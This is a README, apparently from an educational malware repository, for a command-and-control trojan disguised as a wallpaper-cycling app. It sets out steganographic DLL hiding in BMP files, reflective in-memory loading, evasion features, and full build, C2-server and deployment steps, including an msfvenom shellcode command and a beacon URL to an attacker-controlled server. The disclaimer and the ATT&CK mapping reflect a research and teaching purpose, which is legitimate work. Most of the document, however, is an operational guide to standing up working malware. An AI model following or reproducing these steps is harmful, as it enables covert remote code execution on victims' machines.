# Wallpaper C2 Malware

## Educational Purpose Only

This malware sample is provided for educational and research purposes only. Unauthorized use against systems you don't own is illegal and unethical. See the [main repository disclaimer](../../README.md) for full legal information.

---

## Overview

A sophisticated Command & Control (C2) malware that masquerades as a wallpaper cycling application while maintaining covert communication with a remote server. The malware demonstrates advanced techniques including steganography, reflective DLL loading, and multi-stage payload delivery.

<video controls width="600">
  <source src="demo4.mp4" type="video/mp4">
</video>

### High-Level Architecture

```
┌─────────────────┐     ┌─────────────────┐     ┌─────────────────┐
│   mal.exe       │     │   C2 Server     │     │   Attacker      │
│   (Client)      │     │   (Flask)       │     │                 │
└────────┬────────┘     └────────┬────────┘     └────────┬────────┘
         │                       │                       │
         │  1. Extracts DLL      │                       │
         │     from BMPs         │                       │
         │                       │                       │
         │  2. HTTP GET with     │                       │
         │     encrypted beacon  │                       │
         │ ───────────────────►  │                       │
         │                       │                       │
         │                       │  3. Attacker drops    │
         │                       │     pay.bin           │
         │                       │ ◄───────────────────  │
         │                       │                       │
         │  4. Server injects    │                       │
         │     metadata + XOR    │                       │
         │     streams into      │                       │
         │ ◄─── wallpapers ────  │                       │
         │                       │                       │
         │  5. Client reassembles│                       │
         │     and executes      │                       │
         │     shellcode         │                       │
```

## Features

### Offensive Capabilities
- **Steganographic Payload Hiding**: DLL embedded across 3 BMP images using XOR splitting
- **Reflective DLL Loading**: In-memory loading without disk artifacts
- **HTTP C2 Channel**: Disguised as normal wallpaper downloads
- **Dynamic Encryption**: Session keys based on system tick count
- **Multi-Stage Delivery**: Payload split across multiple HTTP requests
- **Threaded Execution**: Shellcode runs independently from main process

### Evasion Techniques
- No suspicious disk artifacts (DLL hidden in images)
- Legitimate-looking wallpaper cycling behavior
- Minimal network signatures
- Dynamic XOR keys per session
- Payload reconstruction requires multiple intercepted requests

## Components

| File | Description |
|------|-------------|
| `mal.c` | Main executable - extracts DLL from BMPs, handles wallpaper cycling |
| `payload.c` | Payload DLL - system info collection, C2 beaconing, shellcode execution |
| `serv.py` | Flask C2 server - beacon parsing, payload injection, response coordination |
| `embed.py` | Utility - embeds DLL into BMP images using XOR stream splitting |
| `Defaults/` | Sample BMP wallpaper images (with embedded payload) |
| `MALWARE_DOCUMENTATION.md` | Detailed technical documentation |

## MITRE ATT&CK Techniques

| Technique ID | Technique Name | Implementation |
|--------------|----------------|----------------|
| T1027.009 | Steganography | DLL hidden in BMP RGB channels |
| T1055.001 | DLL Injection | Reflective DLL loading |
| T1071.001 | Web Protocols | HTTP C2 communication |
| T1573 | Encrypted Channel | XOR-based payload encryption |
| T1620 | Reflective Code Loading | In-memory PE loading |
| T1140 | Deobfuscate/Decode Files | Runtime XOR stream reconstruction |
| T1082 | System Information Discovery | Beacon contains system details |

## Setup Instructions

### Prerequisites

**For Building (Windows):**
- MinGW-w64 or Visual Studio
- Windows SDK

**For C2 Server (Any OS):**
- Python 3.7+
- Flask: `pip install flask`
- PIL: `pip install pillow`
- NumPy: `pip install numpy`

### Building the Malware

1. **Compile the payload DLL:**
   ```bash
   gcc -shared -o pay.dll payload.c -lwininet
   ```

2. **Embed DLL into images:**
   ```bash
   python embed.py
   ```
   This splits `pay.dll` across `default7.bmp`, `default8.bmp`, and `default10.bmp`

3. **Compile main executable:**
   ```bash
   gcc -o mal.exe mal.c -lwininet
   ```

### Running the C2 Server

1. **Configure the server:**
   Edit `serv.py`:
   ```python
   # Update if needed
   WALLPAPER_DIR = os.path.dirname(os.path.abspath(__file__))
   PAYLOAD_FILENAME = "pay.bin"
   ```

2. **Start the server:**
   ```bash
   python serv.py
   ```
   Server runs on `http://0.0.0.0:5000` by default

3. **Update client configuration:**
   Edit `mal.c`:
   ```c
   #define HTTP_URL "http://YOUR_IP:5000/wallpaper"
   ```

4. **Rebuild client with new server address**

### Deploying Payload

1. **Create payload (shellcode):**
   ```bash
   # Example: launch calculator
   msfvenom -p windows/exec CMD=calc.exe -f raw > pay.bin
   ```

2. **Drop payload on server:**
   Place `pay.bin` in the same directory as `serv.py`

3. **Automatic delivery:**
   Next time the client beacons, the server will automatically inject the payload

## Usage Examples

See [MALWARE_DOCUMENTATION.md](MALWARE_DOCUMENTATION.md#example-usage) for detailed usage scenarios and expected behavior.

## Technical Documentation

For deep technical analysis including:
- Phase-by-phase execution flow
- Detailed code walkthroughs
- Encryption/obfuscation mechanisms
- Network protocol specifications

See: **[MALWARE_DOCUMENTATION.md](MALWARE_DOCUMENTATION.md)**

## References

- [MITRE ATT&CK: Steganography](https://attack.mitre.org/techniques/T1027/009/)
- [Reflective DLL Injection](https://github.com/stephenfewer/ReflectiveDLLInjection)
- [Understanding C2 Infrastructure](https://attack.mitre.org/tactics/TA0011/)

## Educational Goals

By studying this malware, you will learn:
- How modern malware hides payloads using steganography
- Techniques for in-memory code execution
- C2 communication protocols and obfuscation
- Multi-stage payload delivery mechanisms
- How to detect and defend against these techniques

---

**Remember: Understanding the attacker's techniques is the first step in building better defenses.**
